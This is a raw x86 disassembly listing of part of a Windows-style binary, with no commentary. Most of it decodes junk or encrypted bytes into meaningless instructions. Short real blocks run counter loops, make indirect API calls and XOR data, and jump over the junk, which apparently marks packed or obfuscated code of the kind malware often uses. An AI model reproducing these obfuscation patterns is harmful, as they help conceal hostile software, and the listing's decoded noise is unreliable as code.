  406c60:	mov    ch,BYTE PTR [esi-0x5cf5a8be]
  406c66:	cmp    ah,BYTE PTR [edi+0x6f866d42]
  406c6c:	test   DWORD PTR [edi+0x5705ea4a],0xc7f947e7
  406c76:	jns    0x406c69
  406c78:	mov    bh,0x8f
  406c7a:	sbb    ecx,DWORD PTR [edi-0x6f]
  406c7d:	rcr    BYTE PTR [ebp+0x6f0c8794],0xf1
  406c84:	shl    ebp,1
  406c86:	pop    edx
  406c87:	sub    eax,0x71e2a471
  406c8c:	mov    ebx,0x62ab66ce
  406c91:	fs xor al,0x4d
  406c95:	(bad)  
  406c96:	jl     0x406cc2
  406c98:	jo     0x406c99
  406c9a:	repnz push ecx
  406c9c:	inc    ebp
  406c9d:	cli    
  406c9e:	jb     0x406ce3
  406ca0:	retf   0xb2fa
  406ca3:	push   ecx
  406ca4:	xchg   BYTE PTR [eax],ah
  406ca6:	xor    BYTE PTR [eax+eax*8],bh
  406ca9:	or     BYTE PTR [eax],0xc3
  406cac:	jne    0x406cc8
  406cae:	jnp    0x406d04
  406cb0:	jne    0x406c64
  406cb2:	push   ecx
  406cb3:	popa   
  406cb4:	fwait
  406cb5:	or     bl,BYTE PTR ds:0x8605add
  406cbb:	pop    edx
  406cbc:	iret   
  406cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cbe:	cwde   
  406cbf:	push   eax
  406cc0:	dec    eax
  406cc1:	bnd jnp 0x406ccd
  406cc4:	(bad)  
  406cc5:	std    
  406cc6:	ja     0x406c75
  406cc8:	fnstenv [esi]
  406cca:	cmp    cl,BYTE PTR [edx-0x15f7bc9]
  406cd0:	sub    ebx,DWORD PTR [ebx]
  406cd2:	xchg   BYTE PTR [edi+ebp*4-0x2a],dl
  406cd6:	sub    BYTE PTR [esp+esi*8-0x7b],ah
  406cda:	adc    DWORD PTR [eax],0x32
  406cdd:	jb     0x406c93
  406cdf:	push   ss
  406ce0:	cmp    DWORD PTR [ebx+eiz*2-0x5da09912],edx
  406ce7:	mov    eax,0xb2e61415
  406cec:	xor    DWORD PTR [ecx-0x3d60abf6],esi
  406cf2:	repz mov edx,0x9c6a8b7e
  406cf8:	xor    esp,DWORD PTR [esi+0x5f5f31f]
  406cfe:	and    DWORD PTR [eax+0x76],ebx
  406d01:	or     BYTE PTR [edx-0xe],bh
  406d04:	push   ss
  406d05:	gs mov esp,0x85e140e5
  406d0b:	jnp    0x406d77
  406d0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d0e:	mov    ebp,0xf3cfa22d
  406d13:	mov    bl,0x6
  406d15:	cmp    ah,BYTE PTR [edi*4+0x9d430fb]
  406d1c:	ins    BYTE PTR es:[edi],dx
  406d1d:	inc    esi
  406d1e:	pop    es
  406d1f:	je     0x406d60
  406d21:	hlt    
  406d22:	movaps xmm6,xmm6
  406d25:	loop   0x406d35
  406d27:	sub    eax,0x291abdeb
  406d2c:	(bad)  
  406d2d:	jmp    0x3e8577c6
  406d32:	pop    ebp
  406d33:	sub    DWORD PTR [ecx],esp
  406d35:	into   
  406d36:	lds    esp,FWORD PTR es:[edi-0x74]
  406d3a:	je     0x406d4b
  406d3c:	mov    eax,ds:0x7367c2c8
  406d41:	pop    esi
  406d42:	fsubr  QWORD PTR [esi+0x291d123a]
  406d48:	jne    0x406d02
  406d4a:	repz fisttp DWORD PTR [ebx]
  406d4d:	hlt    
  406d4e:	sti    
  406d4f:	nop
  406d50:	test   al,0x34
  406d52:	das    
  406d53:	(bad)  
  406d54:	ds pop edi
  406d56:	jne    0x406d88
  406d58:	aam    0xfb
  406d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d5b:	sub    esp,DWORD PTR [edi]
  406d5d:	retf   
  406d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d5f:	aam    0xb0
  406d61:	cmp    al,0x45
  406d63:	aaa    
  406d64:	mov    ds:0x609f6021,al
  406d69:	movlps QWORD PTR [esi],xmm4
  406d6c:	mov    al,ds:0xee2153e8
  406d71:	or     bl,ah
  406d73:	or     eax,0x7d700964
  406d78:	mov    bl,BYTE PTR [ebx+0x2e58000f]
  406d7e:	nop
  406d7f:	idiv   DWORD PTR [edi+0x6bc9cdd]
  406d85:	pushf  
  406d86:	sbb    al,bh
  406d88:	(bad)  [edi]
  406d8a:	mov    eax,0x3db39137
  406d8f:	test   eax,0xa798f85e
  406d94:	jo     0x406dd3
  406d96:	xlat   BYTE PTR ds:[ebx]
  406d97:	in     al,dx
  406d98:	es mov edi,0xd1038b43
  406d9e:	and    DWORD PTR ds:0x43035f,0x0
  406da8:	mov    edi,DWORD PTR ds:0x43035f
  406dae:	inc    edi
  406daf:	mov    DWORD PTR ds:0x43035f,edi
  406db5:	cmp    DWORD PTR ds:0x43035f,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42eaa3
  406dcb:	cmp    DWORD PTR ds:0x43035f,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x43035f
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x43035f,edi
  406de7:	cmp    DWORD PTR ds:0x43035f,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e640,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx+0x4fb88485],si
  406e0c:	mov    eax,ds:0x38f18c27
  406e11:	jle    0x406e91
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406db2
  406e18:	sbb    eax,0x7085097d
  406e1d:	imul   ecx,DWORD PTR [edx],0x10
  406e20:	mov    ds:0xbb7be376,al
  406e25:	push   esp
  406e26:	aas    
  406e27:	jle    0x406e15
  406e29:	push   ds
  406e2a:	(bad)  
  406e2b:	mov    ecx,DWORD PTR [ebx]
  406e2d:	popa   
  406e2e:	mov    WORD PTR [ebx],fs
  406e30:	sbb    esi,ebp
  406e32:	adc    BYTE PTR [edx],ch
  406e34:	loope  0x406dee
  406e36:	mov    ecx,0x9ccd5eb4
  406e3b:	push   0x11
  406e3d:	fmul   st,st(6)
  406e3f:	jge    0x406e1d
  406e41:	mov    esp,0x791d9a54
  406e46:	or     al,0x4
  406e48:	mov    ebp,0xc5ed1951
  406e4d:	fadd   QWORD PTR [ebx]
  406e4f:	adc    eax,0xe16b40b2
  406e54:	rol    BYTE PTR [edi+edi*4-0x69],1
  406e58:	add    eax,0x22552b42
  406e5d:	call   0xfaf3cf0b
  406e62:	and    BYTE PTR [ebx-0x71],0xd2
  406e66:	pop    es
  406e67:	jle    0x406edc
  406e69:	popf   
  406e6a:	xlat   BYTE PTR ds:[ebx]
  406e6b:	hlt    
  406e6c:	sbb    BYTE PTR ds:0x68ae36af,dh
  406e72:	imul   esp,DWORD PTR ds:0x7f58f57c,0xc
  406e79:	dec    esi
  406e7a:	pop    edx
  406e7b:	xchg   edi,eax
  406e7c:	jmp    0xe58afe85
  406e81:	js     0x406e45
  406e83:	imul   DWORD PTR [edx-0x4]
  406e86:	push   es
  406e87:	mov    WORD PTR [edi+0x41],fs
  406e8a:	(bad)  
  406e8b:	sbb    eax,0x6b2c5422
  406e90:	popf   
  406e91:	xchg   ebx,eax
  406e92:	outs   dx,BYTE PTR ds:[esi]
  406e93:	dec    ebx
  406e94:	add    DWORD PTR [ebx],0xd9fa49e9
  406e9a:	test   eax,0x770cb9dc
  406e9f:	cmc    
  406ea0:	dec    edi
  406ea1:	pushf  
  406ea2:	dec    edi
  406ea3:	pop    ss
  406ea4:	lea    edi,[ebx-0xa964fdd]
  406eaa:	retf   0x67d1
  406ead:	xor    edx,DWORD PTR [esi+0x3a842c20]
  406eb3:	iret   
  406eb4:	stos   BYTE PTR es:[edi],al
  406eb5:	cmp    esi,ebp
  406eb7:	dec    ecx
  406eb8:	aam    0xed
  406eba:	push   edi
  406ebb:	shl    BYTE PTR [ecx],cl
  406ebd:	(bad)
  406ec1:	imul   esi,edx,0x40eee9d2
  406ec7:	fcmovnb st,st(4)
  406ec9:	sbb    eax,0xd51801b9
  406ece:	in     eax,dx
  406ecf:	mov    al,ds:0xc40edc41
  406ed4:	mov    bl,0x78
  406ed6:	mov    bh,0xe6
  406ed8:	sbb    ch,bl
  406eda:	lock scas eax,DWORD PTR es:[edi]
  406edc:	ficomp WORD PTR [edi+0x4f]
  406edf:	cmp    eax,0x98f72cfb
  406ee4:	add    BYTE PTR [ecx+eiz*2+0x2d852b5c],bl
  406eeb:	mov    edx,0x37f8c224
  406ef0:	xlat   BYTE PTR ds:[ebx]
  406ef1:	pop    edx
  406ef2:	mov    ah,0xf1
  406ef4:	test   al,0xbc
  406ef6:	(bad)  
  406ef7:	(bad)  
  406ef8:	cmp    al,0xe1
  406efa:	icebp  
  406efb:	popf   
  406efc:	sbb    eax,esp
  406efe:	sti    
  406eff:	and    DWORD PTR [ebx],0x8659fff7
  406f05:	mov    ebx,0x5a9341cb
  406f0a:	jno    0x406f29
  406f0c:	fsub   st(7),st
  406f0e:	imul   DWORD PTR [edi-0x2fcc8c0]
  406f14:	xchg   eax,edi
  406f16:	dec    ebx
  406f17:	xchg   esi,eax
  406f18:	pop    ebp
  406f19:	sub    esp,DWORD PTR [eax+0xbe195cf]
  406f1f:	adc    bh,BYTE PTR [eax-0x5c9c47f7]
  406f25:	cs (bad) 
  406f27:	aam    0x4b
  406f29:	daa    
  406f2a:	jns    0x406f41
  406f2c:	aam    0x22
  406f2e:	mov    dl,0xb5
  406f30:	and    al,0xc
  406f32:	test   eax,0x8eb332d3
  406f37:	cwde   
  406f38:	jnp    0x406ed3
  406f3a:	inc    ebp
  406f3b:	aas    
  406f3c:	ja     0x406ef3
  406f3e:	adc    edx,ecx
  406f40:	aaa    
  406f41:	fwait
  406f42:	das    
  406f43:	(bad)  
  406f44:	mov    dl,0xc4
  406f46:	ins    DWORD PTR es:[edi],dx
  406f47:	xchg   esp,eax
  406f48:	push   ecx
  406f49:	ret    
  406f4a:	xchg   edi,eax
  406f4b:	retf   
  406f4c:	mov    DWORD PTR [ebx-0x2c],ebx
  406f4f:	mov    eax,0x5c412bdf
  406f54:	jb     0x406f6f
  406f56:	sti    
  406f57:	push   es
  406f58:	mov    dh,0x57
  406f5a:	sbb    BYTE PTR [ecx+edx*1-0x34],bh
  406f5e:	adc    al,0x75
  406f60:	or     BYTE PTR [ebx-0x7b],dl
  406f63:	sbb    eax,0x9acc8851
  406f68:	stos   DWORD PTR es:[edi],eax
  406f69:	in     al,dx
  406f6a:	imul   edi,esp,0x43
  406f6d:	imul   ecx,DWORD PTR [eax+0x6951109d],0x609cee1e
  406f77:	or     al,BYTE PTR [edx-0x6b]
  406f7a:	and    eax,0x3a6a0c3f
  406f7f:	xchg   ebx,eax
  406f80:	ins    DWORD PTR es:[edi],dx
  406f81:	cmc    
  406f82:	mov    al,ds:0x2d32d4ea
  406f87:	in     al,dx
  406f88:	xchg   ecx,eax
  406f89:	test   eax,0x9ba20919
  406f8e:	nop    ecx
  406f91:	adc    esi,DWORD PTR [edi]
  406f93:	xchg   DWORD PTR [ebx],eax
  406f95:	jb     0x406fd4
  406f97:	cmp    al,cl
  406f99:	xchg   esi,eax
  406f9a:	(bad)  
  406f9c:	aas    
  406f9d:	xor    dh,BYTE PTR [ebp+0x42]
  406fa0:	repz inc eax
  406fa2:	jo     0x406fdc
  406fa4:	stos   BYTE PTR es:[edi],al
  406fa5:	cld    
  406fa6:	xchg   BYTE PTR [eax+0x44],al
  406fa9:	sub    al,0xe1
  406fab:	mov    DWORD PTR [ebp-0x8],edx
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x4302e5
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x4302c5,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0x6de93d82,edx
  406fd4:	push   0x7ec60d25
  406fd9:	jle    0x406f65
  406fdb:	jg     0x40705b
  406fdd:	jle    0x406f71
  406fdf:	mov    al,0xae
  406fe1:	repnz mov al,ds:0xfad2e181
  406fe7:	enter  0xa8dd,0xb7
  406feb:	out    0xe4,al
  406fed:	cmp    BYTE PTR [ecx],dh
  406fef:	leave  
  406ff0:	aam    0x43
  406ff2:	pop    es
  406ff3:	sahf   
  406ff4:	jo     0x406ff7
  406ff6:	mov    esi,fs
  406ff8:	push   es
  406ff9:	lods   al,BYTE PTR ds:[esi]
  406ffa:	addr16 in al,0x2
  406ffd:	mov    ch,0xdd
  406fff:	std    
  407000:	stc    
  407001:	out    0x23,al
  407003:	aad    0x96
  407005:	gs cwde 
  407007:	jle    0x407051
  407009:	jle    0x406ffd
  40700b:	or     al,0xe
  40700d:	xor    eax,0xc52f95dd
  407012:	push   ds
  407013:	mov    ds:0xa9592456,al
  407018:	pop    edi
  407019:	dec    ecx
  40701a:	lds    esi,FWORD PTR [edi]
  40701c:	pop    esp
  40701d:	pop    ebp
  40701e:	retf   0x2728
  407021:	fstp   TBYTE PTR [ebp-0x34]
  407024:	push   ebx
  407025:	stos   BYTE PTR es:[edi],al
  407026:	add    DWORD PTR [edx+0x48],esp
  407029:	adc    eax,0x6702347
  40702e:	mov    BYTE PTR [ecx+0x7f6b6ee],cl
  407034:	stos   BYTE PTR es:[edi],al
  407035:	pop    edx
  407036:	inc    ebx
  407037:	jmp    0x406fcd
  407039:	das    
  40703a:	in     eax,dx
  40703b:	mov    edx,0x673d94f3
  407040:	aas    
  407041:	mov    WORD PTR [ecx+0x6e4c48ff],ss
  407047:	push   0x766a91f4
  40704c:	cdq    
  40704d:	dec    ebp
  40704e:	clc    
  40704f:	jl     0x4070a5
  407051:	arpl   WORD PTR [ebx+0x2],dx
  407054:	imul   BYTE PTR [ebp-0x20a6ebf2]
  40705a:	jno    0x40704f
  40705c:	(bad)  
  40705d:	out    dx,eax
  40705e:	stos   BYTE PTR es:[edi],al
  40705f:	push   esi
  407060:	(bad)  
  407061:	adc    ecx,DWORD PTR [ebx+0xceba662]
  407067:	dec    eax
  407068:	outs   dx,DWORD PTR ds:[esi]
  407069:	xchg   edi,eax
  40706a:	add    ch,dl
  40706c:	aas    
  40706d:	mov    ebp,0x2d8bd1c1
  407072:	cdq    
  407073:	outs   dx,BYTE PTR ds:[esi]
  407074:	sbb    cl,BYTE PTR [esi]
  407076:	mov    BYTE PTR [edx+0x56],al
  407079:	push   ecx
  40707a:	sub    ebp,edi
  40707c:	vprotb ymm6,xmm2,xmm7
  407081:	inc    edx
  407082:	call   0x2b6925f8
  407087:	mov    ebx,0xb75ef5df
  40708c:	stc    
  40708d:	in     al,0x61
  40708f:	out    0x1e,al
  407091:	outs   dx,BYTE PTR ds:[esi]
  407092:	inc    ecx
  407093:	sub    al,0x71
  407095:	dec    edx
  407096:	lods   al,BYTE PTR ds:[esi]
  407097:	xchg   edx,eax
  407098:	pop    esp
  407099:	or     eax,0xf7c28972
  40709e:	dec    esp
  40709f:	mov    eax,ds:0xe50574cd
  4070a4:	cmp    DWORD PTR [esi],ebx
  4070a6:	sbb    eax,0x41478445
  4070ab:	nop
  4070ac:	bswap  eax
  4070ae:	adc    esi,DWORD PTR [ecx-0x60ad1799]
  4070b4:	xor    BYTE PTR [eax+0x6f],bh
  4070b7:	jb     0x407095
  4070b9:	out    dx,eax
  4070ba:	fiadd  DWORD PTR [edi]
  4070bc:	mov    dh,0x16
  4070be:	or     ecx,DWORD PTR [eax+0x4a9d8333]
  4070c4:	sahf   
  4070c5:	sub    eax,DWORD PTR [edx+0x37]
  4070c8:	iret   
  4070c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070ca:	jp     0x4070c1
  4070cc:	push   esp
  4070cd:	mov    al,0xbf
  4070cf:	mov    ds:0xbeb98482,eax
  4070d4:	lahf   
  4070d5:	cmc    
  4070d6:	cli    
  4070d7:	mov    ebx,0x2113c9d2
  4070dc:	popf   
  4070dd:	js     0x4070ed
  4070df:	(bad)  
  4070e0:	scas   al,BYTE PTR es:[edi]
  4070e1:	fmul   st,st(3)
  4070e3:	rcl    DWORD PTR [edx+0x7aa69c4d],cl
  4070e9:	aad    0xd4
  4070eb:	outs   dx,BYTE PTR ds:[esi]
  4070ec:	dec    ebx
  4070ed:	fmul   QWORD PTR [edx+0x62]
  4070f0:	leave  
  4070f1:	and    eax,0x506eb449
  4070f6:	out    0xe5,eax
  4070f8:	push   edi
  4070f9:	cdq    
  4070fa:	popa   
  4070fb:	lea    esi,[eax]
  4070fd:	xchg   dh,ah
  4070ff:	test   DWORD PTR [edx],edi
  407101:	inc    ebp
  407102:	pop    es
  407103:	sbb    al,0x1e
  407105:	add    dl,BYTE PTR [esi]
  407107:	mov    edx,0xd236793d
  40710c:	shr    BYTE PTR [ecx+0xe553260],1
  407112:	cmp    dh,dl
  407114:	mov    edx,0x14663736
  407119:	add    bh,ah
  40711b:	fdiv   QWORD PTR [ecx]
  40711d:	mov    ebp,0x13855512
  407122:	test   eax,0x5c301209
  407127:	int3   
  407128:	push   edx
  407129:	test   DWORD PTR [esp+esi*2+0x3211d3c9],0x4eca4bc7
  407134:	retf   
  407135:	(bad)  
  407136:	inc    ecx
  407137:	out    0x5c,al
  407139:	in     al,dx
  40713a:	aaa    
  40713b:	push   edi
  40713c:	jae    0x4070c8
  40713e:	xor    eax,0xf950641
  407143:	inc    ebp
  407144:	fadd   DWORD PTR [ebp+0x2e]
  407147:	scas   eax,DWORD PTR es:[edi]
  407148:	ror    DWORD PTR [ebp+0x1248906b],1
  40714e:	mov    ebx,0x5838aa4a
  407153:	(bad)  
  407154:	and    al,0x57
  407156:	lods   al,BYTE PTR ds:[esi]
  407157:	psubusw mm5,QWORD PTR ds:[ecx-0x63d3303e]
  40715f:	pop    ds
  407160:	xchg   bh,ch
  407162:	ds lahf 
  407164:	rdpmc  
  407166:	mov    ebp,0x1cdb9352
  40716b:	xchg   edx,eax
  40716c:	iret   
  40716d:	adc    bl,BYTE PTR [edx+0x2f]
  407170:	int    0x15
  407172:	mov    DWORD PTR [ebp+0xc],edx
  407175:	and    DWORD PTR ds:0x42e640,0x0
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e640
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e640,edi
  407191:	cmp    DWORD PTR ds:0x42e640,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e640,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42e92b
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x4302e9,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x4302cd
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x4302e1,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x4302e1
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x4302e1,edi
  4071fa:	cmp    DWORD PTR ds:0x4302e1,0x6
  407201:	jne    0x407247
  407207:	push   0x42e7a9
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42e92f
  407247:	cmp    DWORD PTR ds:0x4302e1,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x4302e1
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x4302e1,edi
  407261:	cmp    DWORD PTR ds:0x4302e1,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e63c
  40728e:	or     DWORD PTR ds:0x4302e5,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0xbff13f15
  4072a7:	inc    edi
  4072a8:	call   0x7f8a:0x7e7ec799
  4072af:	jle    0x40732f
  4072b1:	or     dh,BYTE PTR [esi]
  4072b3:	jo     0x4072bd
  4072b5:	in     al,0x13
  4072b7:	mov    dl,0x26
  4072b9:	jle    0x4072f8
  4072bb:	add    BYTE PTR [edx-0x5ec5930a],cl
  4072c1:	or     edx,edx
  4072c3:	dec    ax
  4072c5:	and    esi,DWORD PTR [edi]
  4072c7:	in     al,0xe2
  4072c9:	xchg   esp,eax
  4072ca:	je     0x4072b3
  4072cc:	adc    al,0xfe
  4072ce:	nop
  4072cf:	mov    esi,0x32ced453
  4072d5:	or     BYTE PTR [edx],al
  4072d7:	stc    
  4072d8:	mov    edi,0x82d8d408
  4072dd:	dec    esi
  4072de:	or     ebp,eax
  4072e0:	jns    0x40733c
  4072e2:	test   eax,0x15aba7c9
  4072e7:	cmp    BYTE PTR [esi-0xe93bc6],dl
  4072ed:	ja     0x40732b
  4072ef:	hlt    
  4072f0:	test   DWORD PTR [edi-0x300b6c69],ebp
  4072f6:	retf   
  4072f7:	jge    0x4072c1
  4072f9:	fsubr  DWORD PTR [esi-0x46]
  4072fc:	and    edx,edi
  4072fe:	sub    esp,0x66
  407301:	shr    DWORD PTR [eax],1
  407303:	ins    DWORD PTR es:[edi],dx
  407304:	pusha  
  407305:	mov    ds:0x3fa41122,al
  40730a:	push   ebx
  40730b:	xor    dl,BYTE PTR [edi-0x4b]
  40730e:	aaa    
  40730f:	sbb    esp,ebp
  407311:	cmp    ebx,DWORD PTR [edx-0x7c]
  407314:	sub    al,bl
  407316:	test   edi,esi
  407318:	push   es
  407319:	ss aaa 
  40731b:	jl     0x40738b
  40731d:	push   edi
  40731e:	and    BYTE PTR [ecx-0x58432a98],0x30
  407325:	sbb    dh,BYTE PTR [ebp+0x3a]
  407328:	push   ebp
  407329:	cs pop ebp
  40732b:	and    eax,0xc38412be
  407330:	popf   
  407331:	rcl    BYTE PTR [eax+0x383f695],cl
  407337:	mov    cl,0xc7
  407339:	xchg   esi,eax
  40733a:	mov    ds:0xf75d4255,eax
  40733f:	mov    DWORD PTR [ebx+0x3b399c3d],ebx
  407345:	inc    ebx
  407346:	bound  edi,QWORD PTR [ecx+edx*1-0xf]
  40734a:	in     eax,dx
  40734b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40734c:	rcl    BYTE PTR [ebx],0x47
  40734f:	dec    ecx
  407350:	test   eax,0xbdf57eeb
  407355:	dec    esi
  407356:	xchg   ebp,eax
  407357:	mov    ds:0x4031960,al
  40735c:	adc    ecx,DWORD PTR [edx+0x1d27f415]
  407362:	sti    
  407363:	bound  edx,QWORD PTR [ebp+0x6d]
  407366:	push   ds
  407367:	mov    al,ds:0xedc0176e
  40736c:	sbb    bl,BYTE PTR [ebx-0x6f221579]
  407372:	dec    edi
  407373:	sub    bh,BYTE PTR [eax]
  407375:	dec    edi
  407376:	inc    ecx
  407377:	dec    esp
  407378:	lds    ebx,FWORD PTR [esi-0x32c58d29]
  40737e:	adc    edx,DWORD PTR [esi-0x4cb48a85]
  407384:	pop    ecx
  407385:	repnz sar ah,1
  407388:	lds    ebx,FWORD PTR [esi]
  40738a:	nop
  40738b:	cdq    
  40738c:	inc    edx
  40738d:	mov    ds:0xeca8a615,al
  407392:	mov    ch,0xaa
  407394:	jge    0x4073fe
  407396:	cmp    eax,0x648efa84
  40739b:	lock xchg ebp,eax
  40739d:	ins    DWORD PTR es:[edi],dx
  40739e:	mov    cl,BYTE PTR [ecx]
  4073a0:	push   eax
  4073a1:	(bad)  
  4073a3:	pop    edx
  4073a4:	lahf   
  4073a5:	mov    ds:0xf2f67140,al
  4073aa:	adc    al,0x19
  4073ac:	add    DWORD PTR [ebx-0x3486856f],ebx
  4073b2:	pop    edi
  4073b3:	stos   BYTE PTR es:[edi],al
  4073b4:	fs mov ch,0x97
  4073b7:	lods   al,BYTE PTR ds:[esi]
  4073b8:	ret    0x39b2
  4073bb:	and    esp,DWORD PTR [ebx]
  4073bd:	add    dl,BYTE PTR [ebx+eiz*2]
  4073c0:	fwait
  4073c1:	mov    edi,0xcb402fbf
  4073c6:	sub    DWORD PTR [ebp+0x914fec3],ebp
  4073cc:	lock pop edx
  4073ce:	inc    esp
  4073cf:	xchg   edi,eax
  4073d0:	(bad)  
  4073d2:	imul   ebx,DWORD PTR [eax+0x48],0xffffff82
  4073d6:	jb     0x407396
  4073d8:	pop    ss
  4073d9:	pusha  
  4073da:	sbb    ebx,DWORD PTR [ecx]
  4073dc:	gs dec esi
  4073de:	or     al,0x7b
  4073e0:	loop   0x407406
  4073e2:	inc    edx
  4073e3:	push   ss
  4073e4:	loopne 0x4073b3
  4073e6:	sbb    esi,0xffffff93
  4073e9:	fsub   st,st(6)
  4073eb:	sub    cl,BYTE PTR [esi]
  4073ed:	iret   
  4073ee:	retf   0x9c74
  4073f1:	mov    edi,0x4396a6f9
  4073f6:	sbb    BYTE PTR [edx-0x4b],0xf3
  4073fa:	sub    eax,0x53eff45d
  4073ff:	pop    esp
  407400:	clc    
  407401:	lods   eax,DWORD PTR ds:[esi]
  407402:	aas    
  407403:	imul   DWORD PTR [ecx+edx*4+0x1f]
  407407:	adc    al,0x65
  407409:	mov    al,ds:0x50bd2643
  40740e:	add    edi,DWORD PTR [eax-0x3723c91d]
  407414:	mov    eax,ds:0xe44a448c
  407419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40741a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40741b:	enter  0x2b18,0x4c
  40741f:	pop    edi
  407421:	xor    BYTE PTR [edx+0x1f],bl
  407424:	cmp    eax,DWORD PTR ds:0xee1e5ceb
  40742a:	sub    eax,0x5a9d393
  40742f:	or     eax,0x93641d1
  407434:	shr    DWORD PTR [edx+0x5af8e521],cl
  40743a:	sbb    cl,BYTE PTR [edx]
  40743c:	pop    ds
  40743d:	bound  esp,QWORD PTR [edi-0x59]
  407440:	in     eax,dx
  407441:	aaa    
  407442:	push   ebx
  407443:	aaa    
  407444:	cld    
  407445:	xor    edx,eax
  407447:	mov    edi,DWORD PTR [ebp-0x10]
  40744a:	or     DWORD PTR ds:0x430357,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x4302c9,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x43034f,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     BYTE PTR [ecx-0x76],bh
  40747f:	pop    edi
  407480:	dec    ecx
  407481:	xor    eax,0x8a7e7ec5
  407486:	jg     0x407506
  407488:	jle    0x40744c
  40748a:	push   0x638fa627
  40748f:	mov    DWORD PTR [ebx-0x48f994bf],ebx
  407495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407497:	or     DWORD PTR [ebp-0xba67a7b],edx
  40749d:	cmp    al,0x8c
  40749f:	push   ss
  4074a0:	iret   
  4074a1:	imul   ebx,esi,0xca35c322
  4074a7:	hlt    
  4074a8:	aad    0xee
  4074aa:	dec    ecx
  4074ab:	dec    eax
  4074ac:	and    eax,0xe6ae4b30
  4074b1:	mov    al,dh
  4074b3:	xchg   ebx,eax
  4074b4:	aaa    
  4074b5:	add    al,0x21
  4074b7:	dec    ecx
  4074b8:	pop    ebx
  4074b9:	and    al,0xd
  4074bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074bc:	retf   0x6460
  4074bf:	mov    esi,0xb69355fa
  4074c4:	imul   edx,DWORD PTR [eax],0xffffff81
  4074c7:	mov    dl,0x3c
  4074c9:	adc    BYTE PTR [esi+0x49],al
  4074cc:	pop    eax
  4074ce:	mov    fs,WORD PTR [ecx+0x4a2aaeff]
  4074d4:	sub    eax,0x8ba048c8
  4074d9:	fist   WORD PTR [edi-0x145bae75]
  4074df:	stc    
  4074e0:	pop    esp
  4074e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074e2:	and    esi,DWORD PTR [ebx]
  4074e4:	lock inc ebx
  4074e6:	inc    ebp
  4074e7:	jb     0x40748b
  4074e9:	in     al,0x5e
  4074eb:	(bad)  
  4074ec:	(bad)  
  4074ee:	add    eax,0x92118fb4
  4074f3:	jbe    0x4074b3
  4074f5:	shr    BYTE PTR [ebx+edi*2-0x57275544],cl
  4074fc:	fs mov dh,0xde
  4074ff:	push   eax
  407500:	push   ebp
